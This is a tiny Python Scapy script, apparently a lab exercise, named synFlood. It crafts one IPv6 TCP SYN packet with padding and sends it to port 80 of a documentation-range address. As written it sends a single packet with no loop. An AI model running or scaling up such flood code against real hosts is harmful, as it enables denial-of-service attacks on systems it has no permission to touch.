from scapy.all import *

def synFlood(src,tgt):
    L3=IPv6(src=src,dst=tgt)
    L4=TCP(sport=RandShort(),dport=80, flags="S")
    raw = Raw(b"X"*1024)
    pkt=L3/L4/raw
    send(pkt)


src="2001:2::3"
tgt="2001:1::1"
synFlood(src,tgt)    